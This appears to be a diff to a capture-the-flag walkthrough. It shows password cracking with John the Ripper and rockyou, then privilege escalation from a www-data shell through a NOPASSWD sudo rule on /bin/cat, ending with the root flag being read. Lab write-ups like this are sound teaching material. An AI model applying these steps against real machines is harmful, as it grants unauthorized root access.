@@ -115,3 +115,18 @@ john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt merlin.hash
 ```
 Aug 25 21:19:31 ubuntu sudo:   merlin : TTY=pts/0 ; PWD=/home/merlin ; USER=root ; COMMAND=/bin/nano /root/root.txt
 ```
+www-data@ubuntu:/home/merlin$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ubuntu:
+    (ALL) NOPASSWD: /bin/cat
+
+www-data@ubuntu:/home/merlin$ sudo /bin/cat /root/root.txt
+sudo /bin/cat /root/root.txt
+101101ddc16b0cdf65ba0b8a7af7afa5
+www-data@ubuntu:/home/merlin$ 
+
+
